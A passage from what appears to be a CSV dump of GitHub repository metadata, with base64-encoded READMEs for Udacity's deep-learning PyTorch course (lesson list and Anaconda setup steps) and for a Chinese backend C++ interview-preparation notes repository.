ciwgW0ltYWdlIFN0eWxlIFRyYW5zZmVyIFVzaW5nIENvbnZvbHV0aW9uYWwg
TmV1cmFsIE5ldHdvcmtzXShodHRwczovL3d3dy5jdi1mb3VuZGF0aW9uLm9y
Zy9vcGVuYWNjZXNzL2NvbnRlbnRfY3Zwcl8yMDE2L3BhcGVycy9HYXR5c19J
bWFnZV9TdHlsZV9UcmFuc2Zlcl9DVlBSXzIwMTZfcGFwZXIucGRmKSBieSBH
YXR5cyBldC4gYWwuIERlZmluZSBhcHByb3ByaWF0ZSBsb3NzZXMgZm9yIGl0
ZXJhdGl2ZWx5IGNyZWF0aW5nIGEgdGFyZ2V0LCBzdHlsZS10cmFuc2ZlcnJl
ZCBpbWFnZSBvZiB5b3VyIG93biBkZXNpZ24hCgojIyMgUmVjdXJyZW50IE5l
dXJhbCBOZXR3b3JrcwoKKiBbSW50cm8gdG8gUmVjdXJyZW50IE5ldHdvcmtz
IChUaW1lIHNlcmllcyAmIENoYXJhY3Rlci1sZXZlbCBSTk4pXShodHRwczov
L2dpdGh1Yi5jb20vdWRhY2l0eS9kZWVwLWxlYXJuaW5nLXYyLXB5dG9yY2gv
dHJlZS9tYXN0ZXIvcmVjdXJyZW50LW5ldXJhbC1uZXR3b3Jrcyk6IFJlY3Vy
cmVudCBuZXVyYWwgbmV0d29ya3MgYXJlIGFibGUgdG8gdXNlIGluZm9ybWF0
aW9uIGFib3V0IHRoZSBzZXF1ZW5jZSBvZiBkYXRhLCBzdWNoIGFzIHRoZSBz
ZXF1ZW5jZSBvZiBjaGFyYWN0ZXJzIGluIHRleHQ7IGxlYXJuIGhvdyB0byBp
bXBsZW1lbnQgdGhlc2UgaW4gUHlUb3JjaCBmb3IgYSB2YXJpZXR5IG9mIHRh
c2tzLgoqIFtFbWJlZGRpbmdzIChXb3JkMlZlYyldKGh0dHBzOi8vZ2l0aHVi
LmNvbS91ZGFjaXR5L2RlZXAtbGVhcm5pbmctdjItcHl0b3JjaC90cmVlL21h
c3Rlci93b3JkMnZlYy1lbWJlZGRpbmdzKTogSW1wbGVtZW50IHRoZSBXb3Jk
MlZlYyBtb2RlbCB0byBmaW5kIHNlbWFudGljIHJlcHJlc2VudGF0aW9ucyBv
ZiB3b3JkcyBmb3IgdXNlIGluIG5hdHVyYWwgbGFuZ3VhZ2UgcHJvY2Vzc2lu
Zy4KKiBbU2VudGltZW50IEFuYWx5c2lzIFJOTl0oaHR0cHM6Ly9naXRodWIu
Y29tL3VkYWNpdHkvZGVlcC1sZWFybmluZy12Mi1weXRvcmNoL3RyZWUvbWFz
dGVyL3NlbnRpbWVudC1ybm4pOiBJbXBsZW1lbnQgYSByZWN1cnJlbnQgbmV1
cmFsIG5ldHdvcmsgdGhhdCBjYW4gcHJlZGljdCBpZiB0aGUgdGV4dCBvZiBh
IG1vdmlldyByZXZpZXcgaXMgcG9zaXRpdmUgb3IgbmVnYXRpdmUuCiogW0F0
dGVudGlvbl0oaHR0cHM6Ly9naXRodWIuY29tL3VkYWNpdHkvZGVlcC1sZWFy
bmluZy12Mi1weXRvcmNoL3RyZWUvbWFzdGVyL2F0dGVudGlvbik6IEltcGxl
bWVudCBhdHRlbnRpb24gYW5kIGFwcGx5IGl0IHRvIGFubm90YXRpb24gdmVj
dG9ycy4KCiMjIyBHZW5lcmF0aXZlIEFkdmVyc2FyaWFsIE5ldHdvcmtzCgoq
IFtHZW5lcmF0aXZlIEFkdmVyc2FyaWFsIE5ldHdvcmsgb24gTU5JU1RdKGh0
dHBzOi8vZ2l0aHViLmNvbS91ZGFjaXR5L2RlZXAtbGVhcm5pbmctdjItcHl0
b3JjaC90cmVlL21hc3Rlci9nYW4tbW5pc3QpOiBUcmFpbiBhIHNpbXBsZSBn
ZW5lcmF0aXZlIGFkdmVyc2FyaWFsIG5ldHdvcmsgb24gdGhlIE1OSVNUIGRh
dGFzZXQuCiogW0JhdGNoIE5vcm1hbGl6YXRpb25dKGh0dHBzOi8vZ2l0aHVi
LmNvbS91ZGFjaXR5L2RlZXAtbGVhcm5pbmctdjItcHl0b3JjaC90cmVlL21h
c3Rlci9iYXRjaC1ub3JtKTogTGVhcm4gaG93IHRvIGltcHJvdmUgdHJhaW5p
bmcgcmF0ZXMgYW5kIG5ldHdvcmsgc3RhYmlsaXR5IHdpdGggYmF0Y2ggbm9y
bWFsaXphdGlvbnMuCiogW0RlZXAgQ29udm9sdXRpb25hbCBHQU4gKERDR0FO
KV0oaHR0cHM6Ly9naXRodWIuY29tL3VkYWNpdHkvZGVlcC1sZWFybmluZy12
Mi1weXRvcmNoL3RyZWUvbWFzdGVyL2RjZ2FuLXN2aG4pOiBJbXBsZW1lbnQg
YSBEQ0dBTiB0byBnZW5lcmF0ZSBuZXcgaW1hZ2VzIGJhc2VkIG9uIHRoZSBT
dHJlZXQgVmlldyBIb3VzZSBOdW1iZXJzIChTVkhOKSBkYXRhc2V0LgoqIFtD
eWNsZUdBTl0oaHR0cHM6Ly9naXRodWIuY29tL3VkYWNpdHkvZGVlcC1sZWFy
bmluZy12Mi1weXRvcmNoL3RyZWUvbWFzdGVyL2N5Y2xlLWdhbik6IEltcGxl
bWVudCBhIEN5Y2xlR0FOIHRoYXQgaXMgZGVzaWduZWQgdG8gbGVhcm4gZnJv
bSB1bnBhaXJlZCBhbmQgdW5sYWJlbGVkIGRhdGE7IHVzZSB0cmFpbmVkIGdl
bmVyYXRvcnMgdG8gdHJhbnNmb3JtIGltYWdlcyBmcm9tIHN1bW1lciB0byB3
aW50ZXIgYW5kIHZpY2UgdmVyc2EuCgojIyMgRGVwbG95aW5nIGEgTW9kZWwg
KHdpdGggQVdTIFNhZ2VNYWtlcikKCiogW0FsbCBleGVyY2lzZSBhbmQgcHJv
amVjdCBub3RlYm9va3NdKGh0dHBzOi8vZ2l0aHViLmNvbS91ZGFjaXR5L3Nh
Z2VtYWtlci1kZXBsb3ltZW50KSBmb3IgdGhlIGxlc3NvbnMgb24gbW9kZWwg
ZGVwbG95bWVudCBjYW4gYmUgZm91bmQgaW4gdGhlIGxpbmtlZCwgR2l0aHVi
IHJlcG8uIExlYXJuIHRvIGRlcGxveSBwcmUtdHJhaW5lZCBtb2RlbHMgdXNp
bmcgQVdTIFNhZ2VNYWtlci4KCiMjIyBQcm9qZWN0cwoKKiBbUHJlZGljdGlu
ZyBCaWtlLVNoYXJpbmcgUGF0dGVybnNdKGh0dHBzOi8vZ2l0aHViLmNvbS91
ZGFjaXR5L2RlZXAtbGVhcm5pbmctdjItcHl0b3JjaC90cmVlL21hc3Rlci9w
cm9qZWN0LWJpa2VzaGFyaW5nKTogSW1wbGVtZW50IGEgbmV1cmFsIG5ldHdv
cmsgaW4gTnVtUHkgdG8gcHJlZGljdCBiaWtlIHJlbnRhbHMuCiogW0RvZyBC
cmVlZCBDbGFzc2lmaWVyXShodHRwczovL2dpdGh1Yi5jb20vdWRhY2l0eS9k
ZWVwLWxlYXJuaW5nLXYyLXB5dG9yY2gvdHJlZS9tYXN0ZXIvcHJvamVjdC1k
b2ctY2xhc3NpZmljYXRpb24pOiBCdWlsZCBhIGNvbnZvbHV0aW9uYWwgbmV1
cmFsIG5ldHdvcmsgd2l0aCBQeVRvcmNoIHRvIGNsYXNzaWZ5IGFueSBpbWFn
ZSAoZXZlbiBhbiBpbWFnZSBvZiBhIGZhY2UpIGFzIGEgc3BlY2lmaWMgZG9n
IGJyZWVkLgoqIFtUViBTY3JpcHQgR2VuZXJhdGlvbl0oaHR0cHM6Ly9naXRo
dWIuY29tL3VkYWNpdHkvZGVlcC1sZWFybmluZy12Mi1weXRvcmNoL3RyZWUv
bWFzdGVyL3Byb2plY3QtdHYtc2NyaXB0LWdlbmVyYXRpb24pOiBUcmFpbiBh
IHJlY3VycmVudCBuZXVyYWwgbmV0d29yayB0byBnZW5lcmF0ZSBzY3JpcHRz
IGluIHRoZSBzdHlsZSBvZiBkaWFsb2d1ZSBmcm9tIFNlaW5mZWxkLgoqIFtG
YWNlIEdlbmVyYXRpb25dKGh0dHBzOi8vZ2l0aHViLmNvbS91ZGFjaXR5L2Rl
ZXAtbGVhcm5pbmctdjItcHl0b3JjaC90cmVlL21hc3Rlci9wcm9qZWN0LWZh
Y2UtZ2VuZXJhdGlvbik6IFVzZSBhIERDR0FOIG9uIHRoZSBDZWxlYkEgZGF0
YXNldCB0byBnZW5lcmF0ZSBpbWFnZXMgb2YgbmV3IGFuZCByZWFsaXN0aWMg
aHVtYW4gZmFjZXMuCgojIyMgRWxlY3RpdmUgTWF0ZXJpYWwKCiogW0ludHJv
IHRvIFRlbnNvckZsb3ddKGh0dHBzOi8vZ2l0aHViLmNvbS91ZGFjaXR5L2Rl
ZXAtbGVhcm5pbmctdjItcHl0b3JjaC90cmVlL21hc3Rlci90ZW5zb3JmbG93
L2ludHJvLXRvLXRlbnNvcmZsb3cpOiBTdGFydGluZyBidWlsZGluZyBuZXVy
YWwgbmV0d29ya3Mgd2l0aCBUZW5zb3JGbG93LgoqIFtLZXJhc10oaHR0cHM6
Ly9naXRodWIuY29tL3VkYWNpdHkvZGVlcC1sZWFybmluZy12Mi1weXRvcmNo
L3RyZWUvbWFzdGVyL2tlcmFzKTogTGVhcm4gdG8gYnVpbGQgbmV1cmFsIG5l
dHdvcmtzIGFuZCBjb252b2x1dGlvbmFsIG5ldXJhbCBuZXR3b3JrcyB3aXRo
IEtlcmFzLgoKLS0tCgojIERlcGVuZGVuY2llcwoKIyMgQ29uZmlndXJlIGFu
ZCBNYW5hZ2UgWW91ciBFbnZpcm9ubWVudCB3aXRoIEFuYWNvbmRhCgpQZXIg
dGhlIEFuYWNvbmRhIFtkb2NzXShodHRwOi8vY29uZGEucHlkYXRhLm9yZy9k
b2NzKToKCj4gQ29uZGEgaXMgYW4gb3BlbiBzb3VyY2UgcGFja2FnZSBtYW5h
Z2VtZW50IHN5c3RlbSBhbmQgZW52aXJvbm1lbnQgbWFuYWdlbWVudCBzeXN0
ZW0gCmZvciBpbnN0YWxsaW5nIG11bHRpcGxlIHZlcnNpb25zIG9mIHNvZnR3
YXJlIHBhY2thZ2VzIGFuZCB0aGVpciBkZXBlbmRlbmNpZXMgYW5kIApzd2l0
Y2hpbmcgZWFzaWx5IGJldHdlZW4gdGhlbS4gSXQgd29ya3Mgb24gTGludXgs
IE9TIFggYW5kIFdpbmRvd3MsIGFuZCB3YXMgY3JlYXRlZCAKZm9yIFB5dGhv
biBwcm9ncmFtcyBidXQgY2FuIHBhY2thZ2UgYW5kIGRpc3RyaWJ1dGUgYW55
IHNvZnR3YXJlLgoKIyMgT3ZlcnZpZXcKVXNpbmcgQW5hY29uZGEgY29uc2lz
dHMgb2YgdGhlIGZvbGxvd2luZzoKCjEuIEluc3RhbGwgW2BtaW5pY29uZGFg
XShodHRwOi8vY29uZGEucHlkYXRhLm9yZy9taW5pY29uZGEuaHRtbCkgb24g
eW91ciBjb21wdXRlciwgYnkgc2VsZWN0aW5nIHRoZSBsYXRlc3QgUHl0aG9u
IHZlcnNpb24gZm9yIHlvdXIgb3BlcmF0aW5nIHN5c3RlbS4gSWYgeW91IGFs
cmVhZHkgaGF2ZSBgY29uZGFgIG9yIGBtaW5pY29uZGFgIGluc3RhbGxlZCwg
eW91IHNob3VsZCBiZSBhYmxlIHRvIHNraXAgdGhpcyBzdGVwIGFuZCBtb3Zl
IG9uIHRvIHN0ZXAgMi4KMi4gQ3JlYXRlIGFuZCBhY3RpdmF0ZSAqIGEgbmV3
IGBjb25kYWAgW2Vudmlyb25tZW50XShodHRwOi8vY29uZGEucHlkYXRhLm9y
Zy9kb2NzL3VzaW5nL2VudnMuaHRtbCkuCgpcKiBFYWNoIHRpbWUgeW91IHdp
c2ggdG8gd29yayBvbiBhbnkgZXhlcmNpc2VzLCBhY3RpdmF0ZSB5b3VyIGBj
b25kYWAgZW52aXJvbm1lbnQhCgotLS0KCiMjIDEuIEluc3RhbGxhdGlvbgoK
KipEb3dubG9hZCoqIHRoZSBsYXRlc3QgdmVyc2lvbiBvZiBgbWluaWNvbmRh
YCB0aGF0IG1hdGNoZXMgeW91ciBzeXN0ZW0uCgp8ICAgICAgICB8IExpbnV4
IHwgTWFjIHwgV2luZG93cyB8IAp8LS0tLS0tLS18LS0tLS0tLXwtLS0tLXwt
LS0tLS0tLS18CnwgNjQtYml0IHwgWzY0LWJpdCAoYmFzaCBpbnN0YWxsZXIp
XVtsaW42NF0gfCBbNjQtYml0IChiYXNoIGluc3RhbGxlcildW21hYzY0XSB8
IFs2NC1iaXQgKGV4ZSBpbnN0YWxsZXIpXVt3aW42NF0KfCAzMi1iaXQgfCBb
MzItYml0IChiYXNoIGluc3RhbGxlcildW2xpbjMyXSB8ICB8IFszMi1iaXQg
KGV4ZSBpbnN0YWxsZXIpXVt3aW4zMl0KClt3aW42NF06IGh0dHBzOi8vcmVw
by5jb250aW51dW0uaW8vbWluaWNvbmRhL01pbmljb25kYTMtbGF0ZXN0LVdp
bmRvd3MteDg2XzY0LmV4ZQpbd2luMzJdOiBodHRwczovL3JlcG8uY29udGlu
dXVtLmlvL21pbmljb25kYS9NaW5pY29uZGEzLWxhdGVzdC1XaW5kb3dzLXg4
Ni5leGUKW21hYzY0XTogaHR0cHM6Ly9yZXBvLmNvbnRpbnV1bS5pby9taW5p
Y29uZGEvTWluaWNvbmRhMy1sYXRlc3QtTWFjT1NYLXg4Nl82NC5zaApbbGlu
NjRdOiBodHRwczovL3JlcG8uY29udGludXVtLmlvL21pbmljb25kYS9NaW5p
Y29uZGEzLWxhdGVzdC1MaW51eC14ODZfNjQuc2gKW2xpbjMyXTogaHR0cHM6
Ly9yZXBvLmNvbnRpbnV1bS5pby9taW5pY29uZGEvTWluaWNvbmRhMy1sYXRl
c3QtTGludXgteDg2LnNoCgoqKkluc3RhbGwqKiBbbWluaWNvbmRhXShodHRw
Oi8vY29uZGEucHlkYXRhLm9yZy9taW5pY29uZGEuaHRtbCkgb24geW91ciBt
YWNoaW5lLiBEZXRhaWxlZCBpbnN0cnVjdGlvbnM6CgotICoqTGludXg6Kiog
aHR0cDovL2NvbmRhLnB5ZGF0YS5vcmcvZG9jcy9pbnN0YWxsL3F1aWNrLmh0
bWwjbGludXgtbWluaWNvbmRhLWluc3RhbGwKLSAqKk1hYzoqKiBodHRwOi8v
Y29uZGEucHlkYXRhLm9yZy9kb2NzL2luc3RhbGwvcXVpY2suaHRtbCNvcy14
LW1pbmljb25kYS1pbnN0YWxsCi0gKipXaW5kb3dzOioqIGh0dHA6Ly9jb25k
YS5weWRhdGEub3JnL2RvY3MvaW5zdGFsbC9xdWljay5odG1sI3dpbmRvd3Mt
bWluaWNvbmRhLWluc3RhbGwKCiMjIDIuIENyZWF0ZSBhbmQgQWN0aXZhdGUg
dGhlIEVudmlyb25tZW50CgpGb3IgV2luZG93cyB1c2VycywgdGhlc2UgZm9s
bG93aW5nIGNvbW1hbmRzIG5lZWQgdG8gYmUgZXhlY3V0ZWQgZnJvbSB0aGUg
KipBbmFjb25kYSBwcm9tcHQqKiBhcyBvcHBvc2VkIHRvIGEgV2luZG93cyB0
ZXJtaW5hbCB3aW5kb3cuIEZvciBNYWMsIGEgbm9ybWFsIHRlcm1pbmFsIHdp
bmRvdyB3aWxsIHdvcmsuIAoKIyMjIyBHaXQgYW5kIHZlcnNpb24gY29udHJv
bApUaGVzZSBpbnN0cnVjdGlvbnMgYWxzbyBhc3N1bWUgeW91IGhhdmUgYGdp
dGAgaW5zdGFsbGVkIGZvciB3b3JraW5nIHdpdGggR2l0aHViIGZyb20gYSB0
ZXJtaW5hbCB3aW5kb3csIGJ1dCBpZiB5b3UgZG8gbm90LCB5b3UgY2FuIGRv
d25sb2FkIHRoYXQgZmlyc3Qgd2l0aCB0aGUgY29tbWFuZDoKYGBgCmNvbmRh
IGluc3RhbGwgZ2l0CmBgYAoKSWYgeW91J2QgbGlrZSB0byBsZWFybiBtb3Jl
IGFib3V0IHZlcnNpb24gY29udHJvbCBhbmQgdXNpbmcgYGdpdGAgZnJvbSB0
aGUgY29tbWFuZCBsaW5lLCB0YWtlIGEgbG9vayBhdCBvdXIgW2ZyZWUgY291
cnNlOiBWZXJzaW9uIENvbnRyb2wgd2l0aCBHaXRdKGh0dHBzOi8vd3d3LnVk
YWNpdHkuY29tL2NvdXJzZS92ZXJzaW9uLWNvbnRyb2wtd2l0aC1naXQtLXVk
MTIzKS4KCioqTm93LCB3ZSdyZSByZWFkeSB0byBjcmVhdGUgb3VyIGxvY2Fs
IGVudmlyb25tZW50ISoqCgoxLiBDbG9uZSB0aGUgcmVwb3NpdG9yeSwgYW5k
IG5hdmlnYXRlIHRvIHRoZSBkb3dubG9hZGVkIGZvbGRlci4gVGhpcyBtYXkg
dGFrZSBhIG1pbnV0ZSBvciB0d28gdG8gY2xvbmUgZHVlIHRvIHRoZSBpbmNs
dWRlZCBpbWFnZSBkYXRhLgpgYGAKZ2l0IGNsb25lIGh0dHBzOi8vZ2l0aHVi
LmNvbS91ZGFjaXR5L2RlZXAtbGVhcm5pbmctdjItcHl0b3JjaC5naXQKY2Qg
ZGVlcC1sZWFybmluZy12Mi1weXRvcmNoCmBgYAoKMi4gQ3JlYXRlIChhbmQg
YWN0aXZhdGUpIGEgbmV3IGVudmlyb25tZW50LCBuYW1lZCBgZGVlcC1sZWFy
bmluZ2Agd2l0aCBQeXRob24gMy42LiBJZiBwcm9tcHRlZCB0byBwcm9jZWVk
IHdpdGggdGhlIGluc3RhbGwgYChQcm9jZWVkIFt5XS9uKWAgdHlwZSB5LgoK
CS0gX19MaW51eF9fIG9yIF9fTWFjX186IAoJYGBgCgljb25kYSBjcmVhdGUg
LW4gZGVlcC1sZWFybmluZyBweXRob249My42Cglzb3VyY2UgYWN0aXZhdGUg
ZGVlcC1sZWFybmluZwoJYGBgCgktIF9fV2luZG93c19fOiAKCWBgYAoJY29u
ZGEgY3JlYXRlIC0tbmFtZSBkZWVwLWxlYXJuaW5nIHB5dGhvbj0zLjYKCWFj
dGl2YXRlIGRlZXAtbGVhcm5pbmcKCWBgYAoJCglBdCB0aGlzIHBvaW50IHlv
dXIgY29tbWFuZCBsaW5lIHNob3VsZCBsb29rIHNvbWV0aGluZyBsaWtlOiBg
KGRlZXAtbGVhcm5pbmcpIDxVc2VyPjpkZWVwLWxlYXJuaW5nLXYyLXB5dG9y
Y2ggPHVzZXI+JGAuIFRoZSBgKGRlZXAtbGVhcm5pbmcpYCBpbmRpY2F0ZXMg
dGhhdCB5b3VyIGVudmlyb25tZW50IGhhcyBiZWVuIGFjdGl2YXRlZCwgYW5k
IHlvdSBjYW4gcHJvY2VlZCB3aXRoIGZ1cnRoZXIgcGFja2FnZSBpbnN0YWxs
YXRpb25zLgoKMy4gSW5zdGFsbCBQeVRvcmNoIGFuZCB0b3JjaHZpc2lvbjsg
dGhpcyBzaG91bGQgaW5zdGFsbCB0aGUgbGF0ZXN0IHZlcnNpb24gb2YgUHlU
b3JjaC4KCQoJLSBfX0xpbnV4X18gb3IgX19NYWNfXzogCglgYGAKCWNvbmRh
IGluc3RhbGwgcHl0b3JjaCB0b3JjaHZpc2lvbiAtYyBweXRvcmNoIAoJYGBg
CgktIF9fV2luZG93c19fOiAKCWBgYAoJY29uZGEgaW5zdGFsbCBweXRvcmNo
IC1jIHB5dG9yY2gKCXBpcCBpbnN0YWxsIHRvcmNodmlzaW9uCglgYGAKCjYu
IEluc3RhbGwgYSBmZXcgcmVxdWlyZWQgcGlwIHBhY2thZ2VzLCB3aGljaCBh
cmUgc3BlY2lmaWVkIGluIHRoZSByZXF1aXJlbWVudHMgdGV4dCBmaWxlIChp
bmNsdWRpbmcgT3BlbkNWKS4KYGBgCnBpcCBpbnN0YWxsIC1yIHJlcXVpcmVt
ZW50cy50eHQKYGBgCgo3LiBUaGF0J3MgaXQhCgpOb3cgbW9zdCBvZiB0aGUg
YGRlZXAtbGVhcm5pbmdgIGxpYnJhcmllcyBhcmUgYXZhaWxhYmxlIHRvIHlv
dS4gVmVyeSBvY2Nhc2lvbmFsbHksIHlvdSB3aWxsIHNlZSBhIHJlcG9zaXRv
cnkgd2l0aCBhbiBhZGRpdGlvbiByZXF1aXJlbWVudHMgZmlsZSwgd2hpY2gg
ZXhpc3RzIHNob3VsZCB5b3Ugd2FudCB0byB1c2UgVGVuc29yRmxvdyBhbmQg
S2VyYXMsIGZvciBleGFtcGxlLiBJbiB0aGlzIGNhc2UsIHlvdSdyZSBlbmNv
dXJhZ2VkIHRvIGluc3RhbGwgYW5vdGhlciBsaWJyYXJ5IHRvIHlvdXIgZXhp
c3RpbmcgZW52aXJvbm1lbnQsIG9yIGNyZWF0ZSBhIG5ldyBlbnZpcm9ubWVu
dCBmb3IgYSBzcGVjaWZpYyBwcm9qZWN0LiAKCk5vdywgYXNzdW1pbmcgeW91
ciBgZGVlcC1sZWFybmluZ2AgZW52aXJvbm1lbnQgaXMgc3RpbGwgYWN0aXZh
dGVkLCB5b3UgY2FuIG5hdmlnYXRlIHRvIHRoZSBtYWluIHJlcG8gYW5kIHN0
YXJ0IGxvb2tpbmcgYXQgdGhlIG5vdGVib29rczoKCmBgYApjZApjZCBkZWVw
LWxlYXJuaW5nLXYyLXB5dG9yY2gKanVweXRlciBub3RlYm9vawpgYGAKClRv
IGV4aXQgdGhlIGVudmlyb25tZW50IHdoZW4geW91IGhhdmUgY29tcGxldGVk
IHlvdXIgd29yayBzZXNzaW9uLCBzaW1wbHkgY2xvc2UgdGhlIHRlcm1pbmFs
IHdpbmRvdy4K
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
b'Skill-Tree',95624763,b'\xf0\x9f\x90\xbc \xe5\x87\x86\xe5\xa4\x87\xe7\xa7\x8b\xe6\x8b\x9b\xef\xbc\x8c\xe6\xac\xa2\xe8\xbf\x8e\xe6\x9d\xa5\xe6\xa0\x91\xe4\xb8\x8a\xe5\x8f\x96\xe6\x9e\x9c\xe5\xae\x9e',b'C',3,2389,,2389,False,b'https://api.github.com/repos/linw7/Skill-Tree/forks',"IVvlm77niYddKC4vc291cmNlL2dpdGh1Yi5qcGcpCgojIOWQjuWPsOW8gOWP
keaguOW/g+efpeivhgoKPiDlh4blpIfnp4vmi5vvvIzmrKLov47mnaXmoJHk
uIrlj5bmnpzlrp7jgIIKCueci+i/h+W+iOWkmuS5pu+8jOS9huaAu+aYr+W/
mOW+l+W+iOW/q+OAguefpeivhuW5v+W6pui2iuWkp+i2iuWuueaYk+aOpee6
s+aWsOS4nOilv++8jOS9huS7juiAg+Wvn+inkuW6puadpeivtO+8jOiHqueE
tuaYr+WvueafkOS4quaWuemdouS6huino+i2iua3sei2iuWlveOAgumCo+S6
m+Wkp+iAjOWFqOeahOiRl+S9nOiZveeEtuavj+acrOmDveaYr+e7j+WFuOS4
reeahOe7j+WFuO+8jOS9huWunumZheW3peS9nOS4reWPr+iDveWPqueUqOWI
sOWFtuS4reeahOS4gOWwj+mDqOWIhuOAguS5i+WJjeWunuS5oOe7j+WOhuS9
v+aIkeWvueWQjuWPsOW8gOWPkeacieS6huabtOa3seWIu+eahOiupOefpeWS
jOS6huino++8jOeOsOWcqOi3neemu+eni+aLm+WPquacieS4pOS4quaciOS6
hu+8jOi/memHjOWwhuS7peacgOefreeahOevh+W5he+8jOacgOa4heaZsOea
hOWxgue6p+e7k+aehOWOu+aAu+e7k+mCo+S6m+WvuUMrK+WQjuWPsOW8gOWP
keacgOS4uuaguOW/g+eahOWGheWuueOAggoK5oiR546w5Zyo6LaK5Y+R6KeJ
5b6X5bCR5Y2z5piv5aSa77yM55yL5YaN5aSa5Lic6KW/5rKh5pyJ55CG6Kej
6YCP5b276YO95piv55m95pCt77yM5oqK5pyA5bi455So55qE5q+P5aSp6L+H
5LiA6YGN5omN5piv5pyA5pyJ5pWI55qE44CC5byA5Y+R5Lit5oiR5Lus57uP
5bi455So57yT5a2Y5p2l5o+Q6auY5ZCe5ZCQ546H77yM5a2m5Lmg55+l6K+G
5L2V5LiN5Lmf57uZ6Ieq5bex5Yqg5LiqQ2FjaGXlkaLvvJ8KCuacgOWQju+8
jOW4jOacm+Wkp+Wutueni+aLm+mDveiDveaJvuWIsOa7oeaEj+eahOW3peS9
nOOAggoKIyDlv6vpgJ/ntKLlvJUKCuS4iumdouaIkeS7rOaPkOWIsOS6hkNh
Y2hl5p2l57yp5bCP55+l6K+G6IyD5Zu077yM5L2G5piv5Y2z5L2/5piv6KKr
5Y6L57yp6L+H55qE55+l6K+G5L6d5pen5b6I5aSa77yM5oiR5Lus5oCO5LmI
6IO95aSf5Zyo6ISR5rW35Lit5b+r6YCf5qOA57Si5a6D5Lus5ZGi77yf57uT
5ZCI5p+l5om+566X5rOV77yMSGFzaOaXoOeWkeaYr+acgOW/q+eahO+8jOS9
huWPiOacieWkmuWwkeS6uuiDveWkn+e7meS4gOS4qiJrZXki56uL6ams5a+5
5bqU5LiKInZhbHVlIuWRou+8n+aJgOS7pe+8jOacgOmAguWQiOS6uuexu+iu
pOefpeeahOaWueW8j+aYr+mAmui/h+e0ouW8lSArIOagkeeKtue7k+aehO+8
jOWcqOaVtOeQhui/meS7veeslOiusOaXtu+8jOaIkeWIkuWIhuS6huW+iOWk
mue6p+e0ouW8leeUqOadpeWwhuWQhOmDqOWIhuefpeivhueCueWIkuWIhuWI
sOebuOW6lOeahOaooeWdl+S4re+8jOajgOe0ouS7u+aEj+S4gOS4quefpeiv
hueCueacgOWkmjXnuqfmt7HluqbvvIzkuI3ku4Xmo4DntKLpgJ/luqbkuIrl
jrvkuobov5jlj6/ku6Xlr7nmlbTkuKrnn6Xor4bkvZPns7vmnInlro/op4Lo
rqTor4bjgIIKCnwgQ2hhcHRlciAxIHwgQ2hhcHRlciAyIHwgQ2hhcHRlciAz
fCBDaGFwdGVyIDQgfCBDaGFwdGVyIDUgfCBDaGFwdGVyIDYgfCBDaGFwdGVy
IDd8CnwgOi0tLS0tLS0tOiB8IDotLS0tLS0tLS06IHwgOi0tLS0tLS0tLTog
fCA6LS0tLS0tLS0tOiB8IDotLS0tLS0tLS06IHwgOi0tLS0tLS0tLTp8IDot
LS0tLS0tLS06IHwKfCAgW+mUmemimOeyvuino10oaHR0cHM6Ly9naXRodWIu
Y29tL2xpbnc3L1NraWxsLVRyZWUvYmxvYi9tYXN0ZXIv6ZSZ6aKY57K+6Kej
Lm1kKSB8IFvnnJ/popjmkZjlvZVdKGh0dHBzOi8vZ2l0aHViLmNvbS9saW53
Ny9Ta2lsbC1UcmVlL2Jsb2IvbWFzdGVyLyVFNyU5QyU5RiVFOSVBMiU5OCVF
NiU5MSU5OCVFNSVCRCU5NS5tZCl8IFtMaW51eOW3peWFt10oaHR0cHM6Ly9n
aXRodWIuY29tL2xpbnc3L1NraWxsLVRyZWUvYmxvYi9tYXN0ZXIvTGludXjl
t6XlhbcubWQpfCBb57yW56iL6K+t6KiA77yIQysrKV0oaHR0cHM6Ly9naXRo
dWIuY29tL2xpbnc3L1NraWxsLVRyZWUvYmxvYi9tYXN0ZXIv57yW56iL6K+t
6KiAQysrLm1kKSB8IFvmlbDmja7nu5PmnoTkuI7nrpfms5VdKGh0dHBzOi8v
Z2l0aHViLmNvbS9saW53Ny9Ta2lsbC1UcmVlL2Jsb2IvbWFzdGVyL+aVsOaN
rue7k+aehOWPiueul+azlS5tZCkgfCBb6K6h566X5py6572R57ucXShodHRw
czovL2dpdGh1Yi5jb20vbGludzcvU2tpbGwtVHJlZS9ibG9iL21hc3Rlci/o
rqHnrpfmnLrnvZHnu5wubWQpIHwgW+aTjeS9nOezu+e7n10oaHR0cHM6Ly9n
aXRodWIuY29tL2xpbnc3L1NraWxsLVRyZWUvYmxvYi9tYXN0ZXIv5pON5L2c
57O757ufLm1kKSB8CgoKIyDni6znq4vkuJPpopgKCuWTsuWtpuS4re+8jOaV
tOS9k+S4juS4quS9k+eahOWFs+ezu+aYr+eJqei0qOS4lueVjOaZrumBjeWt
mOWcqOeahOinhOW+i+OAguS4iumdouWQhOmDqOWIhuefpeivhuebuOWvueeL
rOeri++8jOaXouimgeaciembtuWPiOimgeacieaVtOaJjeiDveaUtuiOt+ab
tOWkmu+8jOWunuaImOaXoOeWkeaYr+acgOWlveeahOOAggoKLSBb57q45LiK
5Luj56CBXShodHRwczovL2dpdGh1Yi5jb20vbGludzcvUGFwZXItQ29kZSkK
Ci0gW+e7g+aJi+mhueebrl0oaHR0cHM6Ly9naXRodWIuY29tL2xpbnc3L1RL
ZWVkKQoKWyFbbGljZW5zZV0oaHR0cHM6Ly9pbWcuc2hpZWxkcy5pby9naXRo
dWIvbGljZW5zZS9tYXNoYXBlL2FwaXN0YXR1cy5zdmcpXShodHRwczovL29w
ZW5zb3VyY2Uub3JnL2xpY2Vuc2VzL01JVCkK
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
